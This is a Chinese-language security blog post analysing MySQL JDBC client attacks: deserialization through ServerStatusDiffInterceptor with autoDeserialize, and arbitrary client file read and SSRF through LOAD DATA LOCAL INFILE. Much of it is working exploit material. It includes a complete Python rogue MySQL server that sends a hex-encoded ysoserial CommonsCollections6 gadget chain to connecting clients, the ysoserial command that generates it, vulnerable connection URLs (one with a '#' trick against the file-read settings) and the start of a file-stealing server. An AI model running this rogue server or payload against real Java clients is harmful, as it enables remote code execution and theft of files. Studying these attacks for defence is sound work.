<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>JDBC综合分析 | Jiecub3</title>
<meta name="keywords" content="">
<meta name="description" content="0x1 Mysql 反序列化 前言：java调试这边分析完了，但是又很想了解这个mysql恶意服务是怎么搭建的，于是就再从流量层面简单分析了下mysql协议，">
<meta name="author" content="Jiecub3">
<link rel="canonical" href="https://Jiecub3.github.io/zh/posts/java/jdbc/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.6498a9db1bad4c0d045c3aa5ba217809694eb596cf8fff3516fcb871a2dfe03e.css" integrity="sha256-ZJip2xutTA0EXDqluiF4CWlOtZbPj/81Fvy4caLf4D4=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="16x16" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="32x32" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="apple-touch-icon" href="https://Jiecub3.github.io/logo.gif">
<link rel="mask-icon" href="https://Jiecub3.github.io/logo.gif">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="https://Jiecub3.github.io/zh/posts/java/jdbc/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="JDBC综合分析" />
<meta property="og:description" content="0x1 Mysql 反序列化 前言：java调试这边分析完了，但是又很想了解这个mysql恶意服务是怎么搭建的，于是就再从流量层面简单分析了下mysql协议，" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://Jiecub3.github.io/zh/posts/java/jdbc/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2025-02-25T20:01:23+08:00" />
<meta property="article:modified_time" content="2025-02-25T20:01:23+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="JDBC综合分析"/>
<meta name="twitter:description" content="0x1 Mysql 反序列化 前言：java调试这边分析完了，但是又很想了解这个mysql恶意服务是怎么搭建的，于是就再从流量层面简单分析了下mysql协议，"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://Jiecub3.github.io/zh/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "JDBC综合分析",
      "item": "https://Jiecub3.github.io/zh/posts/java/jdbc/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "JDBC综合分析",
  "name": "JDBC综合分析",
  "description": "0x1 Mysql 反序列化 前言：java调试这边分析完了，但是又很想了解这个mysql恶意服务是怎么搭建的，于是就再从流量层面简单分析了下mysql协议，",
  "keywords": [
    
  ],
  "articleBody": "0x1 Mysql 反序列化 前言：java调试这边分析完了，但是又很想了解这个mysql恶意服务是怎么搭建的，于是就再从流量层面简单分析了下mysql协议，以及按照自己的思路改造了下mysql恶意服务。感觉有了跟深刻的理解hh\n环境\nmysql mysql-connector-java 8.0.12 commons-collections commons-collections 3.2.1 客户端\npackage mysql; import java.sql.*; public class mysql_learn { public static void main(String[] args) throws Exception { String ClassName = \"com.mysql.jdbc.Driver\"; String JDBC_Url = \"jdbc:mysql://127.0.0.1:3307/newtest?autoDeserialize=true\u0026queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\"; String username = \"root\"; String password = \"123456\"; Class.forName(ClassName); Connection connection = DriverManager.getConnection(JDBC_Url,username,password); // Connection connection = DriverManager.getConnection(JDBC_Url); } } 恶意mysql服务器\nimport socket import binascii import os greeting_data=\"4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400\" response_ok_data=\"0700000200000002000000\" def receive_data(conn): data = conn.recv(1024) print(\"[*] Receiveing the package : {}\".format(data)) return str(data).lower() def send_data(conn,data): print(\"[*] Sending the package : {}\".format(data)) conn.send(binascii.a2b_hex(data)) def get_payload_content(): #file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] \u003e payload file= r'C:\\\\Users\\\\jie\\\\Desktop\\\\learn\\\\java\\\\TOOLS\\\\ser.bin' if os.path.isfile(file): with open(file, 'rb') as f: payload_content = str(binascii.b2a_hex(f.read()),encoding='utf-8') print(\"open successs\") else: print(\"open false\") #calc payload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878' return payload_content # 主要逻辑 def run(): while 1: conn, addr = sk.accept() print(\"Connection come from {}:{}\".format(addr[0],addr[1])) # 1.先发送第一个 问候报文 send_data(conn,greeting_data) while True: # 登录认证过程模拟 1.客户端发送request login报文 2.服务端响应response_ok receive_data(conn) send_data(conn,response_ok_data) #其他过程 data=receive_data(conn) #查询一些配置信息,其中会发送自己的 版本号 if \"session.auto_increment_increment\" in data: _payload='01000001112e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c21000c000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c21002d000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c21002a000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000001e00000e036465660000000873716c5f6d6f6465000c21005f010000fd00001f00002600000f036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000010036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001103646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000012036465660000000c776169745f74696d656f7574000c3f001500000008a000000000e9000013013104757466380475746638047574663804757466380f757466385f756e69636f64655f63690e534554204e414d45532075746638033132300347504c0131083136373737323136023630754f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d524541440331323007000014fe000002000000' send_data(conn,_payload) data=receive_data(conn) elif \"show warnings\" in data: _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000' send_data(conn, _payload) data = receive_data(conn) if \"set names\" in data: send_data(conn, response_ok_data) data = receive_data(conn) if \"set character_set_results\" in data: send_data(conn, response_ok_data) data = receive_data(conn) if \"session.autocommit\" in data: autocommit_result='01000001012a0000020364656600000014404073657373696f6e2e6175746f636f6d6d6974000c3f000100000008800000000002000003013107000004fe000002000000' send_data(conn, autocommit_result) data = receive_data(conn) if \"show session status\" in data: mysql_data='0100000102360000020364656604746573740c6a6176615f6f626a656374730c6a6176615f6f626a656374730269640269640c3f000b000000030342000000540000030364656604746573740c6a6176615f6f626a656374730c6a6176615f6f626a656374731173657269616c697a65645f6f626a6563741173657269616c697a65645f6f626a6563740c3f00ffff0000fc9000000000060500040131fc0105aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000863616c632e657865740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f400000000000007708000000100000000078787807000005fe000002000000' #mysql_data是测试 返回SHOW SESSION STATUS结果 的原始数据流 payload_content=get_payload_content() payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4) payload_length_hex = payload_length[2:4] + payload_length[0:2] data_len = str(hex(len(payload_content)//2 + 5)).replace('0x', '').zfill(4) data_len_hex = data_len[2:4] + data_len[0:2] mysql_data2='0100000102360000020364656604746573740c6a6176615f6f626a656374730c6a6176615f6f626a656374730269640269640c3f000b000000030342000000540000030364656604746573740c6a6176615f6f626a656374730c6a6176615f6f626a656374731173657269616c697a65645f6f626a6563741173657269616c697a65645f6f626a6563740c3f00ffff0000fc9000000000' mysql_data2=mysql_data2+data_len_hex+'0004'+'0131'+'fc'+payload_length_hex+payload_content mysql_data2+='07000005fe000002000000' send_data(conn, mysql_data2) data = receive_data(conn) if \"show warnings\" in data: payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000' send_data(conn, payload) break if __name__ == '__main__': HOST ='0.0.0.0' PORT = 3307 sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间 sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sk.bind((HOST, PORT)) sk.listen(1) print(\"start fake mysql server listening on {}:{}\".format(HOST,PORT)) run() ● 编写反序列化的恶意数据到文件 ser.bin 中\njava -jar ysoserial.jar CommonsCollections6 calc.exe \u003e ser.bin 0x01 分析 queryInterceptors 这里我想先反着来，先理解poc中这个设置ServerStatusDiffInterceptor，为什么设置这个\nqueryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor 我们知道mysql打的是反序列化，前辈挖可能也是根据readObject定位。\n根据getObject往上则找到ServerStatusDiffInterceptor这个类\n我们后面再说这个咋调用的。\n开头 现在我从DriverManager.getConnection开始调试分析整个流程！（中间部分调试，我觉得沉余就省略了\n这里直接到ConnectionUrl.getConnectionUrlInstance这个地方会对我们传入的url(JDBC_Url)进行分类封装。\n然后到ConnectionImpl，这里会初始化我们设置的queryInterceptors值，o.init会调用ServerStatusDiffInterceptor#init\n然后包装成一个Arraylist存储到this.queryInterceptors中\n然后client端这边想执行一个SET autocommit=1语句\n然后我们看后面是怎么执行的\nNativeProtocol#sendQueryPacket\n这里发现会判断是否有设置queryInterceptors拦截器，有的话会通过这个拦截器完成执行SET autocommit=1这个任务(没有的话，就直接发送这个请求给mysql服务器，执行这条sql语句并返回值)\n然后一路到调用这个拦截器的preProcess()方法\n而ServerStatusDiffInterceptor#preProcess正是调用populateMapWithSessionStatusValues()方法，于是利用点也就穿起来了\npublic \u003cT extends Resultset\u003e T preProcess(Supplier\u003cString\u003e sql, Query interceptedQuery) { populateMapWithSessionStatusValues(this.preExecuteValues); return null; // we don't actually modify a result set } 本来是要执行SET autocommit=1，结果ServerStatusDiffInterceptor转头执行了个SHOW SESSION STATUS，并处理这个返回的结果（利用点也出在）\nSHOW SESSION STATUS 执行结果\nSHOW SESSION STATUS 执行结果其实也就是相当于select * from table(table是两个字段的)\n下面rs.getObject(1), rs.getObject(2)就是获取第一个字段，第二个字段\nautoDeserialize 然后就到了最终利用点，这里数据类型得是BLOB，然后这里也是为什么要设置autoDeserialize(true可以用1绕过)，其实BIT类型也有readobject，但是我搜索的时候bit长度不能太长(这个没去验证)，但是序列化数据是需要长度的，所以这里用BLOB\n上述就是调试的整个流程\n0x02 mysql恶意服务构造 package mysql; import java.sql.Connection; import java.sql.DriverManager; import java.sql.ResultSet; import java.sql.Statement; public class contect_test { public static void main(String[] args) throws Exception{ String Driver = \"com.mysql.cj.jdbc.Driver\"; String DB_URL = \"jdbc:mysql://127.0.0.1:3306/newtest?characterEncoding=utf8\u0026useSSL=false\u0026queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\u0026autoDeserialize=true\"; Class.forName(Driver); Connection conn = DriverManager.getConnection(DB_URL,\"root\",\"123456\"); Statement statement = conn.createStatement(); // 5.执行SQL的对象去执行SQL，返回结果集 String sql = \"select * from test.java_objects;\"; ResultSet resultSet = statement.executeQuery(sql); System.out.println(resultSet); } } 我们去连接一个正常的mysql服务，看看是怎么交互的\n流量层面 通过tcp.port ==3306 \u0026\u0026 mysql，赛选流量\n我们可以看到在执行SHOW SESSION STATUS前，client和mysql服务之间其实已经做过一些交互了。\n这里因为都是mysql协议，有些tcp协议没有，11这步我看参考文章没有，但是我这边请求的时候有这步\n1.--\u003e应该是client去请求mysql (tcp) 2.\u003c--mysql返回一个 Greeting (有mysql版本信息) 3.--\u003eclient去连接mysql，数据库和登录信息 4.\u003c--mysql返回OK 5.--\u003eclint 查询了一大堆sql变量 SELECT @@session.auto_increment_increment AS auto_increment_increment,... //这里省略了 6.\u003c--mysql返回对应值 7.--\u003eclient设置 SET NAMES utf8 8.\u003c--mysql返回OK 9.--\u003eSET character_set_results = NULL 10.\u003c--mysql返回OK 11.--\u003eSELECT @@session.autocommit 12.\u003c--mysql返回对应值 13.--\u003eSHOW SESSION STATUS 14.\u003c--mysql返回对应值 然后这里思路是跟着参考文章进行的，这里查询的语句其实是固定的，而结果其实也可以是固定的，client又分别不出来。所以前面的返回值，我们都可以照抄mysql服务的，我们只需要构造出SHOW SESSION STATUS的返回值即可。\n构造数据包 这里我和参考文章的构造思路不一样，其实不用想那么复杂，也不用完全自己去构造一个数据包，这些都可以让mysql来帮我们做\n我之前说过SHOW SESSION STATUS的结果，其实就是查询了一个有两个字段的表，上图中两个field packet就对应的两列，而每个row packet其实就是一行结果的一对值而已，而每个值都会被getObject()调用的（也就是都有可能反序列化的）。\n我起初想的直接替换一个row packet，这样整体的len以及其他参数也不会被影响改好自己这个row packet就行了。但其实不行，利用点这里switch的是field中的Type（而不是靠row packet中的数据识别），所以我们也要修改掉这个值。而改这个的话，其他值也会受影响，不如搞个新的。\nField field = this.columnDefinition.getFields()[columnIndexMinusOne]; switch (field.getMysqlType()) { case BIT: ... 我说过SHOW SESSION STATUS的结果，其实就是查询了一个有两个字段的表\n那我直接建一个这样的表，并且第二个数据就是序列化的数据。然后抓到这个流量直接替换不就行了！\nmysql\nCREATE TABLE java_objects ( id INT AUTO_INCREMENT PRIMARY KEY, serialized_object BLOB ); insert java_objects values (1,load_file('C:\\\\Users\\\\jie\\\\Desktop\\\\learn\\\\java\\\\TOOLS\\\\ser.bin')); 然后我们要发送的数据从MySQL Protocol - column count到MySQL Protocol - response OK结束，测试是成功的。（脚本中mysql_data就是要发送整个的值）\n不过我这边多了一步SELECT @@session.autocommit，不过问题不大，在原脚本基础上再加一个这个的返回值就好了\n然后可以利用了但是，不方便，总不能每次换个链子就去抓个流量吧\nif \"show session status\" in data: mysql_data='01000001023...' ... 那其实改的话，也就控制好上图这个row packet就行。也就是控制好长度的变化就行了\n然后这块row packet数据是从0605开始到序列化数据结束，我这里直接一起说了吧，懒得每个截图了\n这里将这个整个要返回的数据分成这几块\n0100000102360000020364656…\n//column count和filed packet那块数据，我用mysql都设置好了，不用改 060500 04 0131 fc 0105\n长度这里都是采用小端序，0605实际长度要倒过来计算，0506的值才是1286\n060500（row packet开头）代表的整个row packet的长度，这里选到Packet Length: 1286右边对应的是060500，这里我开始觉得00是用来分割的，经过下方**Packet Length 验证**的分析，Packet Length确实对应3byte\n04代表Packet Number: 4，意思是这是第四个数据包。在这个poc下，这个值也是固定的\n0131 01代表的是长度及len=1，31十六进制对应49十进制（代表int 1），这个也是固定的\nfc，应该是代表BLOB数据类型的！——！\n0105 及就是序列化数据的长度了\naced0005737200116a6176612e… //序列化数据\n07000005fe000002000000 //MySQL Protocol - response OK 数据\n所以要注意的就是row packet的整个len和序列化数据的len\npayload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4) payload_length_hex = payload_length[2:4] + payload_length[0:2] data_len = str(hex(len(payload_content)//2 + 5)).replace('0x', '').zfill(4) data_len_hex = data_len[2:4] + data_len[0:2] 那简单说说吧，这里len//2是因为获取的是16进制的长度，但两个16进制字符才代表一个数据，所以要除2\n然后data_len为什么要+5,data_len对应流量中两个text的长度，第一个是0131这里+2，第二个还有fc+序列化数据的长度(len需要两个数据记录) 没算上这里要+3，所以要+5 //参考文章这里是+4,估计是没第一个text\n然后就得到上面用的脚本啦，脚本也只是在前辈脚本上涂涂画画hhh，感觉还不错\n不过我Greeting那个返回数据，我用我8.0.x版本的mysql生成的数据发送就是不行，用原脚本5.7的就可以，其他的数据都没问题就这个地方不行，看着也没啥毛病！——！\n0x2 Mysql 任意文件读取 \u0026 SSRF Mysql 任意文件读取原理 **利用条件：**client端具有文件读取权限\nload data infile \"/data/data.csv\" into table TestTable; load data local infile \"/data/test.csv\" into table TestTable; 第一行是读取服务端本地的文件，第二行是读取客户端本地的文件。\n问题就出在第二行\n该漏洞的核心原理在于MySQL服务端可以利用 LOAD DATA LOCAL 命令来读取MYSQL客户端的任意文件。\n客户端：把我我本地/data/test.csv的内容插入到TestTable表中去 服务端：请把你本地/etc/passwd的内容发送给我 //正常应该是要求client端发送/data/test.csv的内容 客户端：好的，这是我本地/etc/passwd的内容：…. 服务端：到这我们就获取到了/etc/passwd的内容 环境\n依赖用mysql反序列化的就行\n然后运行mysql恶意服务\npackage mysql; import java.sql.Connection; import java.sql.DriverManager; public class read_file { public static void main(String[] args) throws Exception { String Driver = \"com.mysql.cj.jdbc.Driver\"; // 1、加载驱动 Class.forName(Driver); Connection conn = DriverManager.getConnection(\"jdbc:mysql://127.0.0.1:3307/test?allowLoadLocalInfile=true\u0026allowUrlInLocalInfile=true\u0026maxAllowedPacket=655360#\u0026serverTimezone=Asia/Shanghai\u0026allowLoadLocalInfile=false\u0026allowUrlInLocalInfile=false\",\"win_hosts\",\"123456\"); // Connection conn = DriverManager.getConnection(\"jdbc:mysql://127.0.0.1:3306/newtest?allowLoadLocalInfile=true\u0026allowUrlInLocalInfile=true\u0026maxAllowedPacket=655360\u0026serverTimezone=Asia/Shanghai\",\"root\",\"123456\"); System.out.println(conn); } } 0x01 分析 此分析借助了 https://github.com/fnmsd/MySQL_Fake_Server 这位佬写的工具。使用还是很好用的，但是感觉不是很好读，我也不想细看，直接分析流量吧，然后自己写一个吧\n分析前我就在想，java连接mysql也不会自己执行load data local infile吧，这个咋触发的呀，分析完怎么说呢，不用java请求执行load data local infile，但是java能处理Response LOCAL INFILE就行\n那直接看到NativeSession#loadServerVariables，看这个第一个if的判断，这里会获取mysql服务端的版本和5.1.0进行一个比较，这里我们希望进入else，进入if其实也能操作的(下方0x02有验证)\n这里我们mysql恶意服务端版本是5.0.2,compareTo()中大于返回1，等于返回0，小于返回-1\n第一个都是5，第二个我们是0\u003c1所以这里返回-1\n然后进入else\nelse { NativePacketPayload resultPacket = sendCommand(this.commandBuilder.buildComQuery(null, versionComment + \"SHOW VARIABLES\"), false, 0); Resultset rs = ((NativeProtocol) this.protocol).readAllResults(-1, false, resultPacket, false, null, new ResultsetFactory(Type.FORWARD_ONLY, null)); ... 这里会给mysql服务端发送一个SHOW VARIABLES，然后java客户端这边会处理mysql返回的数据,然后漏洞利用也就在这个readAllResults()处理数据这里面了\n这里其实if和else处理mysql数据逻辑是一样的，所以我觉得应该都是可以利用的（可以的哟）\n我们跟进readAllResults(),跟进到TextResultsetReader#read\n这里会先判断mysql返回值有没有字段，这里我们要让我们的columnCount为-1才行，要进入下方的else\n那我们跟进看看具体逻辑吧，传入的类型是INT_LENENC，进入对应case\n会和mysql返回的数据的第一个byte和0xff做\u0026运算值为251（其实就是0xfb）即返回NULL_LENGTH(-1)\n可以看到这里必须是-1才行（这里if其实也是判断是不是LOCAL INFILE Packet (0xfb)类型），resultPacket.readString()会去识别mysql数据中的文件名，然后this.protocol.sendFileToServer()读取发送文件内容给mysql服务端\n文件名获取逻辑：其实就是取第一个byte(0xfb用来表示类型的)，以及去除后面的00\n然后看到sendFileToServer()，这里我们知道要让allowLoadLocalInfile=true\n下面有个关于allowUrlInLocalInfile的设置，true可以远程加载，这里我们读取的是本地文件其实无所谓这个参数\n然后read读取文件数据后，send发送给mysql服务端\n[*]Mysql SSRF 上面分析中说到这个allowUrlInLocalInfile，给这个参数设置trueorYES，或进入下面这个else中，URL.openSteam()这里会发出url请求，下方read和send还会吧请求返回的结果发送给我们的恶意MySQL服务\n这里测试下面这两个都是可以成功请求的 http://baidu.com/ file:///c:\\windows\\win.ini 继续跟进openSteam()的话，url请求会在这个writeRequests()发送\nPacket Length 验证 为了监测这个是3字节还是2字节，我这里想的是传一个超过0xffff长度的数据，看mysql会怎么操作，发现超过0x4000，就会进行分段传输处理，所以我还是认为00是用来分割的\n# 定义要生成的文件路径 file_path = 'large_binary_file.bin' # 设定目标文件大小，这里将其设为 0x10000（大于 0xffff） target_size = 0x10000 # 以二进制写入模式打开文件 with open(file_path, 'wb') as file: # 每次写入一个字节的数据，循环直至达到目标文件大小 for _ in range(target_size): # 写入一个字节，值为 0 file.write(b'a') print(f\"已生成数据长度大于 0xffff 的二进制文件: {file_path}\") CREATE TABLE large_text_table ( id INT AUTO_INCREMENT PRIMARY KEY, -- 自增的主键字段 large_text_data LONGTEXT -- 用于存储大文本数据的字段 ); load data local infile \"C:\\\\Users\\\\jie\\\\Desktop\\\\learn\\\\java\\\\TOOLS\\\\mysql\\\\large_binary_file.bin\" into table large_text_table; package mysql; import java.sql.Connection; import java.sql.DriverManager; import java.sql.ResultSet; import java.sql.Statement; public class contect_test { public static void main(String[] args) throws Exception{ String Driver = \"com.mysql.cj.jdbc.Driver\"; String DB_URL = \"jdbc:mysql://127.0.0.1:3306/newtest?characterEncoding=utf8\u0026useSSL=false\u0026queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\u0026autoDeserialize=true\"; String read_URL=\"jdbc:mysql://127.0.0.1:3306/newtest?allowLoadLocalInfile=true\u0026allowUrlInLocalInfile=true\u0026serverTimezone=Asia/Shanghai\"; Class.forName(Driver); // Connection conn = DriverManager.getConnection(DB_URL,\"root\",\"123456\"); Connection conn = DriverManager.getConnection(read_URL,\"root\",\"123456\"); Statement statement = conn.createStatement(); // 5.执行SQL的对象去执行SQL，返回结果集 String sql = \"load data local infile \\\"C:\\\\\\\\Users\\\\\\\\jie\\\\\\\\Desktop\\\\\\\\learn\\\\\\\\java\\\\\\\\TOOLS\\\\\\\\mysql\\\\\\\\large_binary_file.bin\\\" into table large_text_table;\"; ResultSet resultSet = statement.executeQuery(sql); System.out.println(resultSet); } } 下面这个图是mysql终端去执行的流量，发现远远没到0xffff就分段传输了\nload data local infile \"C:\\\\Users\\\\jie\\\\Desktop\\\\learn\\\\java\\\\TOOLS\\\\mysql\\\\large_binary_file.bin\" into table large_text_table; 然后用java当client去连接mysql传输，发现确实是3byte代表长度，然后我有想看看超过0xffffff又会怎么样呢\n于是给python脚本target_size = 0x1100000 生成新文件\n发现上限是0x0ffff4，然后进行分段传输，这是没有设置maxAllowedPacket=655360的情况\n如果设置了maxAllowedPacket，分段最大值\u003cmaxAllowedPacket设置值\n第二个数据包\n0x02 恶意服务构造 流程理解\n分析流程中可以知道其实就是下图这一步变成了SHOW VARIABLES，然后我们mysql端设置返回了一个MySQL Protocol - local infile,然后java根据这个数据包，返回我们要读取的文件内容\n然后我改了一个最简单的demo\nimport socket import binascii import os greeting_data=\"4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400\" response_ok_data=\"0700000200000002000000\" def receive_data(conn): data = conn.recv(1024) print(\"[*] Receiveing the package : {}\".format(data)) return str(data).lower() def send_data(conn,data): print(\"[*] Sending the package : {}\".format(data)) conn.send(binascii.a2b_hex(data)) # 主要逻辑 def run(): while 1: conn, addr = sk.accept() print(\"Connection come from {}:{}\".format(addr[0],addr[1])) # 1.先发送第一个 问候报文 send_data(conn,greeting_data) while True: # 登录认证过程模拟 1.客户端发送request login报文 2.服务端响应response_ok receive_data(conn) send_data(conn,response_ok_data) #其他过程 data=receive_data(conn) #查询一些配置信息,其中会发送自己的 版本号 if \"session.auto_increment_increment\" in 